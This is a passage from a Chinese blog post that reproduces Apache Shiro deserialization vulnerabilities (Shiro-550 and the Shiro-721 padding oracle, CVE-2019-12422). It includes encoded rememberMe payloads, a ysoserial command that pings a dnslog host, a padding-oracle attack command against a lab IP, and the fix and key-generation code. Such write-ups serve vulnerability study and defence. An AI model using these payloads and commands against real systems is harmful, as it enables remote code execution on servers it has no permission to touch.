<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-java-cookie-poc.png" alt="550-java-cookie-poc"></p>
<ul>
<li>发送rememberMe Cookie，即可成功执行命令</li>
</ul>
<p><img src="/images/middleware/shiro/550-burp-cookie-poc-ser.png" alt="550-burp-cookie-poc-ser"></p>
<p><img src="/images/middleware/shiro/550-tmp-succsee.png" alt="550-tmp-succsee"></p>
<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ul>
<li><p>▲ 无论是否升级shiro到1.2.5及以上，如果shiro的rememberMe功能的AES密钥一旦泄露，就会导致反序列化漏洞</p>
</li>
<li><p>官方修复</p>
<ul>
<li>删除代码里的默认密钥</li>
<li>默认配置里注释了默认密钥</li>
<li>如果不配置密钥，每次会重新随机一个密钥</li>
<li>▲ 可以看到并没有对反序列化做安全限制，只是在逻辑上对该漏洞进行了处理。如果在配置里自己单独配置AES的密钥，并且密钥一旦泄露，那么漏洞依然存在</li>
</ul>
</li>
<li><p>漏洞修复的方案同时进行：</p>
<ul>
<li>升级shiro到1.2.5及以上</li>
<li>如果在配置里配置了密钥，请利用官方提供的方法生成密钥：\org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenerateCipherKey</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 随机生成秘钥，参考org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey(int)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] generateNewKey() &#123;</span><br><span class="line">        KeyGenerator kg;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            kg = KeyGenerator.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException var5) &#123;</span><br><span class="line">            String msg = <span class="string">"Unable to acquire AES algorithm.  This is required to function."</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(msg, var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        kg.init(<span class="number">128</span>);</span><br><span class="line">        SecretKey key = kg.generateKey();</span><br><span class="line">        <span class="keyword">byte</span>[] encoded = key.getEncoded();</span><br><span class="line">        <span class="keyword">return</span> encoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h5 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h5><ul>
<li>升级Shiro到最新版本</li>
<li>WAF拦截Cookie中长度过大的rememberMe值</li>
</ul>
<h3 id="0X01-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#0X01-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="0X01 Shiro Padding Oracle Attack(Shiro-721)"></a>0X01 Shiro Padding Oracle Attack(Shiro-721)</h3><blockquote>
<p>CVE-2019-12422</p>
</blockquote>
<h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><ul>
<li>由于Shiro Cookie中通过AES-128-CBC模式加密rememberMe字段存在问题，用过可通过Padding Oracle加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行序列化攻击，导致任意代码执行</li>
</ul>
<h5 id="Padding-Oracle-Attack攻击分析"><a href="#Padding-Oracle-Attack攻击分析" class="headerlink" title="Padding Oracle Attack攻击分析"></a>Padding Oracle Attack攻击分析</h5><ul>
<li>▲ 关键思路在于通过构造IV值（也就是前一组密文）利用服务器的返回值结合PKCS #5来找到正确的中间值，从而绕过加密算法，直接得到解密后的内容</li>
<li>主要是通过服务器的返回值来判断自己的构建的IV值是否正确，进而猜测初正确的中间值IV值，中间值IV再和 获取到的原来的IV值异或便可得到明文，攻击有两个重要的假设前提<ul>
<li>攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV值（初始化向量）</li>
<li>攻击者能够触发密文的解密过程，且能够知道密文的解密结果</li>
</ul>
</li>
<li>能够 获得密文我们才能得到正确的明文，而密文的第一组分组 需要有正确的初始向量才能解密。能触发密文的解密过程才能在不知道密钥的情况下绕过加密算法直接得到我们想要的结果，而知道密文的解密结果是通过服务器返回值来判断结果是不是符合填充标准来实现的</li>
</ul>
<h5 id="影响版本：Apache-Shiro-lt-1-4-2版本"><a href="#影响版本：Apache-Shiro-lt-1-4-2版本" class="headerlink" title="影响版本：Apache Shiro &lt; 1.4.2版本"></a>影响版本：Apache Shiro &lt; 1.4.2版本</h5><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li>登录Shiro网站，从Cookie中获取rememberMe字段值</li>
</ul>
<p><img src="/images/middleware/shiro/721-remember-cookie.png" alt="721-remember-cookie"></p>
<ul>
<li>利用DNSlog探测，通过ysoserial生成payload</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">"ping cedp8j.dnslog.cn"</span> &gt; payload.class</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/721-dnslog-payload.png" alt="721-dnslog-payload"></p>
<ul>
<li>使用rememberMe值作为prefix，加载Payload，进行<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">Padding Oracle</a>攻击</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br><span class="line"></span><br><span class="line">java -jar PaddingOracleAttack.jar http://192.168.67.153:8080/ quT6mlx30kPSeU+sXkH2wXE9d5oWVXkhToumO+4+tICqaWkpBq77H2AFuWz5t7JNHXXre0UfVXFpvk7vjfolR1EkJNftIFLHZ26+cPikj3mp6V2AgEzcyHdgJ/UVaDSyUxNrxpnLpjlfxe1V7X3MCroxSkis6Y/uB2BIN9M4p8mp50RMzlIxOSBNtMY9sJOb48eAo8OO4aTvzMKsFyzaO0fTwcueNxCJqiCdgovpj8vrp3R1CpRIeHwq7ldVBio95bI1Twtuv+Gy6kNDLsV41aeL0RM2tqp2XVgzTQ+Hi3H4kzF2/dzLU7M5Mg7g94uggu/NnV7HCYTX6SYHTRaH729JCEe2OFkYtwVEKk9s9cOxSPxIoLVRSgAZwKRO3CByEqAxm3L4MmuORAgorZf15DC0X1/OeFixLBN85LxitUwOtmFUidnWQQI/YaJDYxOU1+6HITJhHNgpMIKm3P46n06l302+k1vagcIl1BaresGoN93ahagQe2To/Tj33/EyAfVG0NbCu0Olp89aWzTxIw== 16 payload.class</span><br></pre></td></tr></table></figure>

<ul>
<li>爆破成功，输出Result</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/720-padding-cookie.png" alt="720-padding-cookie"></p>
<ul>
<li>使用构造的rememberMe攻击字符串重新请求网站</li>
</ul>
<p><img src="/images/middleware/shiro/721-burp-rememberMe.png" alt="721-burp-rememberMe"></p>
<ul>
<li>成功触发payload，在DNSlog获取到目标IP</li>
</ul>
<p><img src="/images/middleware/shiro/721-dnslog-result.png" alt="721-dnslog-result"></p>
<ul>
<li>▲ 2020-08-22 因为环境问题，多次复现均存在问题，所以用<code>ping cedp81j.dnslog.cn</code>来代替，猜测原因如下<ul>
<li>payload过长，blocksize错误</li>
<li>环境为Shiro-550的环境，无法复现Shiro-721的实验</li>
</ul>
</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="https://www.cnblogs.com/loong-hon/p/10619616.html" target="_blank" rel="noopener">Apache Shiro Java反序列化漏洞分析</a></li>
<li><a href="https://www.cnblogs.com/kbhome/p/13061633.html" target="_blank" rel="noopener">shiro java 反序列漏洞复现</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/13239046.html" target="_blank" rel="noopener">Shiro反序列化漏洞利用汇总（Shiro-550+Shiro-721）</a></li>
<li><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088" target="_blank" rel="noopener">Shiro反序列化漏洞</a></li>
<li><a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">Padding oracle attack详细解析</a></li>
</ul>

            </div>
          

    
      <footer class="post-footer">
		

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/10/27/md%E6%96%87%E4%BB%B6/sop_cors_csp/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">SOP_CORS_CSP</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/10/27/md%E6%96%87%E4%BB%B6/shiro_privilge_bypass/">
        <span class="next-text nav-default">Shiro权限绕过漏洞</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon"><span class="copyright-year">
    
        &copy;
    
        2019 -
    
    2020
    <span class="footer-author">Tomas.</span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
